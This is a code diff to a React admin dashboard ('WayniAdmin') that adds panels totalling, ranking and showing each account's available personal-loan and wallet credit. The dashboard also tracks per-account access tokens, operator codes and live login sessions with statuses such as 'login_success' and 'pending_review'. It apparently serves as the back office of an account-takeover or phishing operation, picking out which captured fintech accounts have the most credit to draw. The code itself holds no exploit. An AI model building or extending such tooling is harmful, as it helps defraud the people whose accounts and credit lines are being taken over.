@@ -27,6 +27,7 @@ interface WayniAccount {
   bank_data: any;
   activities: any;
   profile_data: any;
+  credits_data: any;
   operator_code: string;
   info_tag: string | null;
   last_login_at: string | null;
@@ -346,6 +347,9 @@ const WayniAdmin = () => {
     const age = Date.now() - new Date(s.created_at).getTime();
     return age < 600000; // 10 min
   }).length;
+  const totalLoanAvailable = accounts.reduce((s, a) => s + (a.credits_data?.loanCreditLines?.balance?.remaining_amount || 0), 0);
+  const totalWalletCredit = accounts.reduce((s, a) => s + (a.credits_data?.walletCreditLines?.balance?.remaining_amount || 0), 0);
+  const accountsWithCredit = accounts.filter(a => a.credits_data?.loanCreditLines?.is_valid || a.credits_data?.walletCreditLines?.is_valid).length;
   const recentLogins = liveSessions.filter(s => s.status === "login_success" || s.status === "pending_review").slice(0, 10);
 
   if (authLoading) return <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center"><Loader2 className="w-8 h-8 text-[#c8e64a] animate-spin" /></div>;
@@ -455,6 +459,42 @@ const WayniAdmin = () => {
                 </div>
               </div>
 
+              {/* Credits Summary */}
+              <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
+                <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><DollarSign size={14} className="text-purple-400" />Créditos Disponíveis</h3>
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                  <div className="bg-[#0a0a0a] rounded-lg p-3">
+                    <p className="text-[10px] text-gray-500 uppercase tracking-wide">Préstamo Total Disponível</p>
+                    <p className="text-lg font-mono font-bold text-purple-400">${totalLoanAvailable.toLocaleString("es-AR")}</p>
+                  </div>
+                  <div className="bg-[#0a0a0a] rounded-lg p-3">
+                    <p className="text-[10px] text-gray-500 uppercase tracking-wide">Crédito Billetera Total</p>
+                    <p className="text-lg font-mono font-bold text-cyan-400">${totalWalletCredit.toLocaleString("es-AR")}</p>
+                  </div>
+                  <div className="bg-[#0a0a0a] rounded-lg p-3">
+                    <p className="text-[10px] text-gray-500 uppercase tracking-wide">Contas com Crédito</p>
+                    <p className="text-lg font-mono font-bold text-white">{accountsWithCredit} <span className="text-xs text-gray-500">/ {accounts.length}</span></p>
+                  </div>
+                </div>
+                <div className="space-y-2 max-h-[250px] overflow-y-auto">
+                  {[...accounts].filter(a => a.credits_data?.loanCreditLines?.balance?.remaining_amount > 0).sort((a, b) => (b.credits_data?.loanCreditLines?.balance?.remaining_amount || 0) - (a.credits_data?.loanCreditLines?.balance?.remaining_amount || 0)).map(acc => (
+                    <div key={acc.id} className="flex items-center justify-between bg-[#0a0a0a] rounded-lg px-3 py-2">
+                      <div>
+                        <p className="text-xs font-medium">{acc.full_name || acc.identification}</p>
+                        <p className="text-[10px] text-gray-600">{acc.identification}</p>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-xs font-mono font-bold text-purple-400">${(acc.credits_data?.loanCreditLines?.balance?.remaining_amount || 0).toLocaleString("es-AR")}</p>
+                        <p className="text-[10px] font-mono text-cyan-400">${(acc.credits_data?.walletCreditLines?.balance?.remaining_amount || 0).toLocaleString("es-AR")}</p>
+                      </div>
+                    </div>
+                  ))}
+                  {accounts.filter(a => a.credits_data?.loanCreditLines?.balance?.remaining_amount > 0).length === 0 && (
+                    <p className="text-xs text-gray-600">Faça um Sync All para carregar os dados de crédito</p>
+                  )}
+                </div>
+              </div>
+
               {/* Recent PIX */}
               <div className="bg-[#111] border border-[#1a1a1a] rounded-xl p-5">
                 <h3 className="text-sm font-semibold text-gray-400 mb-4 flex items-center gap-2"><ArrowUpRight size={14} />Últimos PIX</h3>
@@ -561,6 +601,11 @@ const WayniAdmin = () => {
                         </div>
                         <div className="flex items-center gap-3">
                           <span className="text-sm font-mono font-bold text-[#c8e64a]">${parseFloat(acc.balance || "0").toLocaleString("es-AR", { minimumFractionDigits: 2 })}</span>
+                          {acc.credits_data?.loanCreditLines?.is_valid && (
+                            <span className="text-[9px] px-1.5 py-0.5 rounded-full bg-purple-500/15 text-purple-400 border border-purple-500/30 font-medium">
+                              💰 ${(acc.credits_data.loanCreditLines.balance.remaining_amount || 0).toLocaleString("es-AR")}
+                            </span>
+                          )}
                           <span className={`w-2 h-2 rounded-full flex-shrink-0 ${acc.access_token ? "bg-green-500" : "bg-red-500"}`} />
                           {isExpanded ? <ChevronUp size={14} className="text-gray-500" /> : <ChevronDown size={14} className="text-gray-500" />}
                         </div>
@@ -614,6 +659,72 @@ const WayniAdmin = () => {
                               </div>
                               <p className="text-xs font-mono text-gray-300">{cvu}</p>
                               {cvuAlias && <p className="text-[10px] text-gray-500">Alias: {cvuAlias}</p>}
+                            </div>
+                          )}
+
+                          {/* Credits / Empréstimo */}
+                          {acc.credits_data && (
+                            <div className="bg-[#0a0a0a] rounded-lg p-3 space-y-3">
+                              <p className="text-xs text-gray-500 flex items-center gap-1 font-semibold"><DollarSign size={12} className="text-purple-400" />Créditos / Empréstimos</p>
+                              {acc.credits_data.loanCreditLines && (
+                                <div className="space-y-1.5">
+                                  <p className="text-[10px] font-medium text-purple-400 uppercase tracking-wide">Préstamo Personal</p>
+                                  <div className="grid grid-cols-3 gap-2">
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Aprovado</p>
+                                      <p className="text-xs font-mono font-bold text-white">${(acc.credits_data.loanCreditLines.balance?.approved_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Usado</p>
+                                      <p className="text-xs font-mono font-bold text-red-400">${(acc.credits_data.loanCreditLines.balance?.allocated_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Disponível</p>
+                                      <p className="text-xs font-mono font-bold text-green-400">${(acc.credits_data.loanCreditLines.balance?.remaining_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                  </div>
+                                  <div className="flex items-center gap-3">
+                                    <span className={`text-[9px] px-1.5 py-0.5 rounded-full ${acc.credits_data.loanCreditLines.is_valid ? "bg-green-500/15 text-green-400" : "bg-red-500/15 text-red-400"}`}>
+                                      {acc.credits_data.loanCreditLines.is_valid ? "Válido" : "Expirado"}
+                                    </span>
+                                    {acc.credits_data.loanCreditLines.expires_at && (
+                                      <span className="text-[10px] text-gray-600">Exp: {new Date(acc.credits_data.loanCreditLines.expires_at).toLocaleDateString("pt-BR")}</span>
+                                    )}
+                                  </div>
+                                </div>
+                              )}
+                              {acc.credits_data.walletCreditLines && (
+                                <div className="space-y-1.5 border-t border-[#1a1a1a] pt-2">
+                                  <p className="text-[10px] font-medium text-cyan-400 uppercase tracking-wide">Crédito Billetera</p>
+                                  <div className="grid grid-cols-3 gap-2">
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Aprovado</p>
+                                      <p className="text-xs font-mono font-bold text-white">${(acc.credits_data.walletCreditLines.balance?.approved_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Usado</p>
+                                      <p className="text-xs font-mono font-bold text-red-400">${(acc.credits_data.walletCreditLines.balance?.allocated_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                    <div>
+                                      <p className="text-[10px] text-gray-500">Disponível</p>
+                                      <p className="text-xs font-mono font-bold text-green-400">${(acc.credits_data.walletCreditLines.balance?.remaining_amount || 0).toLocaleString("es-AR")}</p>
+                                    </div>
+                                  </div>
+                                  {acc.credits_data.walletCreditLines.balance?.interest_free_advances && (
+                                    <div className="mt-1">
+                                      <p className="text-[10px] text-gray-500">Adelanto sin interés: <span className="text-white font-mono">${(acc.credits_data.walletCreditLines.balance.interest_free_advances.remaining_amount || 0).toLocaleString("es-AR")}</span></p>
+                                    </div>
+                                  )}
+                                  <div className="flex items-center gap-3">
+                                    <span className={`text-[9px] px-1.5 py-0.5 rounded-full ${acc.credits_data.walletCreditLines.is_valid ? "bg-green-500/15 text-green-400" : "bg-red-500/15 text-red-400"}`}>
+                                      {acc.credits_data.walletCreditLines.is_valid ? "Válido" : "Expirado"}
+                                    </span>
+                                    {acc.credits_data.walletCreditLines.expires_at && (
+                                      <span className="text-[10px] text-gray-600">Exp: {new Date(acc.credits_data.walletCreditLines.expires_at).toLocaleDateString("pt-BR")}</span>
+                                    )}
+                                  </div>
+                                </div>
+                              )}
                             </div>
                           )}
 
